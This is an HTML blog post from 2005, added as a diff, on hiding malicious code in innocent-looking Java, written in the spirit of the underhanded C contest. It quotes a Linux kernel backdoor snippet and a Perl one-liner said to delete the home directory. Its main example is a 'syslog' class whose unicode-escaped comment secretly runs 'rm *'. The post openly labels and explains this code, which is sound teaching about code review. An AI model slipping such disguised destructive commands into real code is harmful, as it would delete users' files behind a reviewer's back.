@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+  <title>Writing malicious code in Java - Incompleteness</title>
+  <link rel="canonical" href="http://incompleteness.me/blog/2005/09/28/writing-malicious-code-in-java/" />
+  <meta name="author" content="Joe Walker" /><link href="http://incompleteness.me/blog/atom.xml" rel="alternate" title="Incompleteness" type="application/atom+xml" /><link href="http://incompleteness.me/favicon.png" rel="shortcut icon" /><link href="http://incompleteness.me/styles/normalize.css" media="screen, projection" rel="stylesheet" type="text/css" /><link href="http://incompleteness.me/styles/blog.css" media="screen, projection" rel="stylesheet" type="text/css" /><link href="http://incompleteness.me/styles/twitter.css" media="screen, projection" rel="stylesheet" type="text/css" /><meta charset="utf-8" /><meta name="HandheldFriendly" content="True" /><meta name="MobileOptimized" content="320" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+</head>
+
+<body>
+  <nav role="navigation">
+  <ul role="subscription" data-subscription="rss">
+    <li><a href="http://incompleteness.me/blog/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  </ul>
+  <form action="http://google.com/search" method="get">
+    <fieldset role="site-search">
+      <input type="hidden" name="q" value="site:incompleteness.me" />
+      <input class="search" type="text" name="q" results="0" placeholder="Search" />
+    </fieldset>
+  </form>
+  <ul role="main-navigation">
+    <li><a href="http://incompleteness.me/">Incompleteness</a></li>
+  </ul>
+</nav>
+
+  <div id="main">
+    <article class="hentry">
+      <h1><a href="http://incompleteness.me/blog/2005/09/28/writing-malicious-code-in-java/">Writing malicious code in Java</a></h1><section class="content"><p>The <a href="http://www.brainhz.com/underhanded">underhanded C contest</a> is all about writing C code that looks innocent enough to get past a security review, but does something nasty on the side. It got me thinking about how to subvert things in Java.</p><p>Somewhat predictably the C contest was dominated by a small number of tricks:</p><img align="right" src="http://incompleteness.me/images/posts/malicious-code-1.jpg" /><ul>
+<li>Buffer overflow</li>
+<li>Array bounds violation</li>
+<li>Getting = and == the wrong way around</li>
+</ul><p>Java neatly sidesteps the first 2 by doing the checking for you. It’s kind of silly that we’re still fighting those 2 issues something like 30 years since they were first identified as being serious problems.</p><p>Java does a lot to shut down the =/== confusion by refusing to silently convert to a boolean. So Java programmers are a lot safer there too. Some code <a href=" http://www.ussg.iu.edu/hypermail/linux/kernel/0311.0/0635.html">nearly got into the Linux kernel</a> containing a just such a back-door:</p><pre>
+if ((options == (__WCLONE|__WALL)) &amp;&amp; (current-uid <span style="color: red;"><b>=</b></span> 0))
+    retval = -EINVAL;
+</pre><p>The net effect was to become root rather than check you are root. Oops.</p><p><b>Java's Strengths: High alpha to punctuation ratio</b></p><p>Some languages resemble line noise, and consequently can be very hard to understand. Perl would be the obvious culprit. I’m told that the following will delete your home directory:</p><pre>perl -e '$??s:;s:s;;$?::s;;=]=%-{</pre><p>(I read it on Slashdot so it must be true. Of course I know you’re not going to test it out either so I could have just written rubbish above and no-one would know.)</p><p>Any language with a low alpha to punctuation ratio has plenty of scope for hiding malicious code in amongst innocent code. This is one of the reasons why generics has got a bad press – it lowers Java's alpha to punctuation ratio. It’s also the reason why I’m not too keen on regexs.</p><p><b>Java's Strengths: Security Manager</b></p><p>We perhaps ought to use this more than we do. I would guess that the vast majority of Java installations do not use the SecurityManager even in institutions that have high security requirements and don't particularly like trusting their programmers.</p><p><b>Java's Weaknesses</b></p><p>Java does have weaknesses, and the code below shows one of them.</p><p>I thought about using the trick of making immutable strings become <a href="http://incompleteness.me/blog/2005/05/26/java-lang-string-is-not-immutable/">mutable</a> but decided there was a better way.</p><p>So here is my attempt at hiding malicious code using Java. It should be fairly obvious that the byte array contains "rm *" (which will delete all the files from the current directory on Unix) so that bit isn't well hidden. I guess I'd need to hide that bit away somewhere. The question is how did I subvert things so that the byte array at the bottom actually gets passed into the runtime.exec() at the top?</p><p>Since the code is Unix specific, on Windows I get the error message: "<code>java.io.IOException: CreateProcess: rm * error=2</code>":</p><img src="http://incompleteness.me/images/posts/malicious-code-2.png" /><p>DO NOT RUN THIS CODE UNLESS YOU REALLY WANT TO DELETE RANDOM FILES FROM YOUR COMPUTER. THE CODE BELOW IS MALICIOUS BUT IT IS DESIGNED TO LOOK INNOCENT.</p><style type="text/css">
+.keyword { color:#7F0055; }
+.commnt  { color:#3F7F5F; }
+.string  { color:#2A00FF; }
+.answer  { color:white; }
+</style><pre>
+<span class="keyword">import</span> java.io.OutputStream;
+<span class="keyword">import</span> java.net.Socket;
+
+<span class="keyword">public</span> <span class="keyword">class</span> Test {
+
+  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) <span class="keyword">throws</span> Exception {
+    Test test = <span class="keyword">new</span> Test();
+    test.debug(<span class="string">"hello"</span>);
+  }
+
+  <span class="keyword">public</span> <span class="keyword">void</span> debug(String msg) <span class="keyword">throws</span> Exception {
+    String s = <span class="string">"/usr/bin/logger "</span>;
+    Runtime r = Runtime.getRuntime();
+
+    <span class="keyword">if</span> (System.getProperty(<span class="string">"os.name"</span>).equals(<span class="string">"linux"</span>)) {
+      <span class="commnt">/*
+       * On linux we can make use of the  /usr/bin/logger command to keep
+       * things simple.
+       */</span>
+      r.exec(s + msg);
+    }
+    <span class="keyword">else</span> {
+      <span class="commnt">/*
+       * Syslog code borrowed from log4j  by Ceki Gulc\u00FC
+       * Network syslog calls must begin  with the following byte sequence:
+       * \u002A\u002F \u0072 \u002E  \u0065\u0078\u0065c (\u0022 \u0072\u006D \u002A \u0022) \u003B \u002F\u002A</span>
+       */
+      Socket socket = <span class="keyword">new</span> Socket(<span class="string">"loghost"</span>, 514);
+      OutputStream out = socket.getOutputStream();
+      out.write(<span class="keyword">new</span> <span class="keyword">byte</span>[] { 0x2A, 0x2F, 0x72, 0x2E, 0x65, 0x78, 0x65, 0x22,  0x72, 0x6D, 0x22, 0x3B, 0x2F, 0x2A });
+      out.write(msg.getBytes());
+    }
+  }
+}
+</pre></section><section class="meta">
+  <span class="byline author vcard">
+    Posted by <span class="fn">Joe Walker</span>
+  </span>
+  <time datetime="2005-09-28T08:00:16+00:00" pubdate="pubdate">
+    <span class="day">28</span>
+    <span class="month">Sep</span>
+    <span class="year">2005</span>
+  </time>
+</section><section class="sharing">
+  <a href="http://twitter.com/share" class="twitter-share-button" data-via="joewalker" data-url="http://incompleteness.me/blog/2005/09/28/writing-malicious-code-in-java/" data-counturl="http://incompleteness.me/blog/2005/09/28/writing-malicious-code-in-java/">Tweet</a>
+  <div class="g-plusone" data-size="medium"></div>
+</section>
+      <section class="comments">
+        <h2>Comments</h2>
+        
+
+        <div>
+          
+          <section class="comments">
+            <p>Comments have been turned off on old posts</p>
+          </section>
+        </div>
+      </section>
+    </article>
+
+    <aside role="sidebar">
+  <section>
+
+  <h2><a href="http://incompleteness.me/blog/">Incompleteness</a></h2>
+  <p class="indent">
+    <a href="http://incompleteness.me/blog/archives/">Archives</a><br />
+    <a href="http://incompleteness.me/blog/atom.xml">atom.xml</a><br />
+  </p>
+  <p>
+    If it's a choice between<br />
+    incomplete or wrong,<br />
+    side with <a href="http://en.wikipedia.org/wiki/G%C3%B6del%27s_incompleteness_theorems">Gödel</a>.
+  </p>
+
+  <h2>About</h2>
+  <p>
+    I'm Joe Walker. I work for Mozilla making developer tools better
+    i.e. creating tomorrow's Firebug.
+  </p>
+  <p>
+    See also <a href="https://github.com/joewalker">joewalker</a> on Github
+    and <a href="https://twitter.com/joewalker">@joewalker</a> on Twitter, and
+    <a href="https://plus.google.com/103130341946168853745/posts">103130341946168853745</a>
+    on Google+.
+  </p>
+
+  <h2>Projects</h2>
+  <ul>
+    <li>
+      <a href="https://github.com/joewalker/gcli">GCLI</a> is a web developers
+      command-line that's being used in Firefox Developer Tools, and alongside
+      Ace
+    </li>
+    <li>
+      <a href="https://github.com/joewalker/domtemplate">DOM Template</a>
+      is an experimental DOM template engine with some nice features like
+      asynchronous layout
+    </li>
+    <li>
+      <a href="https://github.com/joewalker/csstools">CSS Doctor</a> is an
+      experiment into how we can improve the CSS telemetry in a browser
+    </li>
+    <li>
+      <a href="http://directwebremoting.org/dwr/index.html">DWR</a> is a Java
+      library that enables Java on the server and JavaScript in a browser to
+      interact and call each other as simply as possible
+    </li>
+  </ul>
+</section>
+  <section>
+  <h2>Recent Posts</h2>
+  <ul id="recent_posts">
+    <li class="post">
+      <a href="http://incompleteness.me/blog/2011/12/14/combating-self-xss/">Combating Self-XSS</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2011/09/16/how-to-eat-an-elephant/">How to Eat an Elephant</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2010/09/13/marketing-according-to-the-browser-makers/">Marketing (according to the browser makers)</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2010/02/01/apple-and-adobe-obituaries-and-idealism/">Apple and Adobe, Obituaries and Idealism</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2009/08/13/collaboration-in-bespin/">Collaboration in Bespin</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2009/05/27/command-lines/">Command Lines</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2009/04/15/introducing-david-marginian/">Introducing David Marginian</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2009/02/16/the-power-of-bespin/">The Power of Bespin</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2009/02/04/undoable-silent-autoupdate/">Undoable Silent Autoupdate</a>
+    </li><li class="post">
+      <a href="http://incompleteness.me/blog/2009/02/04/bespin-and-mozilla/">Bespin and Mozilla</a>
+    </li>
+  </ul>
+</section>
+  <section>
+  <h2>Latest Tweets</h2>
+
+  <ul id="tweets">
+    <li class="loading">Status updating...</li>
+  </ul>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function() {
+      getTwitterFeed("joewalker", 4, false);
+    });
+  </script>
+
+  <script src="http://incompleteness.me/scripts/twitter.js" type="text/javascript"></script>
+  <a href="http://twitter.com/joewalker" class="twitter-follow-button" data-width="208px" data-show-count="false">Follow @joewalker</a>
+</section>
+</aside>
+  </div>
+
+  <footer>
+  <p>
+    Copyright © 2011 - Joe Walker -
+    <span class="credit">Powered by <a href="https://github.com/joewalker/jspress/">JSPress</a></span>
+  </p>
+</footer><script type="text/javascript">
+  (function() {
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.async = true;
+    script.src = 'https://apis.google.com/js/plusone.js';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(script, s);
+  })();
+</script><script type="text/javascript">
+  (function() {
+    var twitterWidgets = document.createElement('script');
+    twitterWidgets.type = 'text/javascript';
+    twitterWidgets.async = true;
+    twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+    document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+  })();
+</script>
+</body>
+</html>
